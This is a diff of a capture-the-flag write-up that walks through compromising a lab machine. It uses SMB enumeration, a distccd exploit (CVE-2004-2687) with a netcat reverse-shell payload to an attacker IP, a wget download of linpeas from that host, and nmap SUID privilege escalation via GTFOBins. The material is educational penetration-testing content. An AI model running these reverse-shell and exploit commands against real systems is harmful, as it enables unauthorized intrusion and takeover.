@@ -21,8 +21,8 @@ and get back some users.
 ![image](https://user-images.githubusercontent.com/110210595/185814007-319d68bc-004b-4242-b3e0-a943b4eda8e9.png)
 
 we can see that tmp is READ, WRITE. Lets login and see what we can find.<br>
-I use ``smbclient \\\\10.10.10.3\\tmp markdown`` and we get a hit.<br>
-I use ```markdown\  ls```  to see what we can find. Unfortunately there is nothing here either.<br>
+I use ``` smbclient \\\\10.10.10.3\\tmp markdown ``` and we get a hit.<br>
+I use ``` ls ```  to see what we can find. Unfortunately there is nothing here either.<br>
 We could use put and get files here but there is no port 80 open for us to execute the files to gain a shell from here. Some bad luck but we got more info so lets keep looking.
 
 ![image](https://user-images.githubusercontent.com/110210595/185814036-42698e61-b4e6-4be4-84de-df540f801f33.png)
@@ -32,7 +32,7 @@ I go to google and search for "<em><strong>distccd v1 exploit</em></strong>" fir
 after reading the exploit it seems to generate a random alpha numeric string. Reads the string. And looks for the trigger exploit which is <em><strong>command, host, port</em></strong><br>
 If it is able to connect to the host it will send the payload and hopefully give us a reverse shell.
 
-Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did  ``` markdown chmod +x CVE-2004-2687.py ```<br>
+Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did  ``` chmod +x CVE-2004-2687.py ```<br>
 the file is ready to be used. First I started a listener on my attacking machine with ``` markdown nc -lvnp 9001 ``` and then used the following command<br>
 ``` markdown ./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` No good, got errors.<br>
 Then I tried. ``` markdown python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh" ``` I got a connected to remote service Ok but then the
@@ -44,12 +44,12 @@ Next up,  ``` markdown python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.
 
 ![image](https://user-images.githubusercontent.com/110210595/185814162-05876fb9-000c-4612-bcfc-bd4d8fc70e88.png)
 
-Let's upgrade the shell. I used the following. \
-``` markdown python -c 'import pty; pty.spawn("/bin/bash")' ``` python3 and python2 didn't work. \
-``` markdown export TERM=xterm ``` \
-``` markdown stty raw -echo && fg ``` \
-``` markdown enter ``` \
-``` markdown enter ``` \
+Let's upgrade the shell. I used the following.<br>
+``` python -c 'import pty; pty.spawn("/bin/bash")' ``` python3 and python2 didn't work.<br>
+``` export TERM=xterm ```<br>
+``` stty raw -echo && fg ```<br>
+``` enter ```<br>
+``` enter ```<br>
 
 We're a normal user daemon. I started off with ``` markdown sudo -l ``` but it asked for a password. Let's move on.
 I look around a bit and ``` markdown cd /home ``` directory and do a ``` markdown ls ``` and see what's there. Nothing good in the user directory but I did go into makis and find the <em><strong>user.txt</em></strong> file. I do a cat user.txt at it and we get out our first flag.  
@@ -58,11 +58,11 @@ I look around a bit and ``` markdown cd /home ``` directory and do a ``` markdow
 
 ![image](https://user-images.githubusercontent.com/110210595/185814191-f868ba55-884e-4c9e-ba39-267b4ee7455c.png)
 
-Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh \
-I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine. \
-I use python3 -m http.server 80 get the server up and running. \
-On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox. \
-The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file. \
+Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh<br>
+I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine.<br>
+I use python3 -m http.server 80 get the server up and running.<br>
+On the victim machine ill be in the /tmp directory and use wget://10.10.14.10/linpeas.sh which is my attacking machines ip from HackTheBox.<br>
+The file gets transferred over no problem. I use the chmod +x linpeas.sh making it an executable file.<br>
 I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.
 
 ![image](https://user-images.githubusercontent.com/110210595/185814232-c92b51cf-c297-46b9-ad1f-ed45077f1d5d.png)
@@ -71,15 +71,15 @@ I use ./linpeas.sh and it kicks off no problem. We get back a lot of results. Se
 
 ![image](https://user-images.githubusercontent.com/110210595/185814242-ca1ef7ad-efb5-47bd-8b56-bedfb902f6c7.png)
 
-the /usr/bin/nmap suid \
-I head over to https://gtfobins.github.io/ and search for nmap \
-I cd /usr/bin where the suid is located. \
-I start off with shell code (a) and nothing happened. So I keep going down the list. \
+the /usr/bin/nmap suid<br>
+I head over to https://gtfobins.github.io/ and search for nmap<br>
+I cd /usr/bin where the suid is located.<br>
+I start off with shell code (a) and nothing happened. So I keep going down the list.<br>
 Shell (b) worked!
 
 ![image](https://user-images.githubusercontent.com/110210595/185814276-6c882b38-ce84-4183-a828-49b30153bc7a.png)
 
-we can now cd /root and see what is there which is the root.txt flag! \
+we can now cd /root and see what is there which is the root.txt flag!<br>
 we have successfully rooted this box!
 
 ![image](https://user-images.githubusercontent.com/110210595/185814294-98c871d4-6e47-46cd-b258-79796039924c.png)
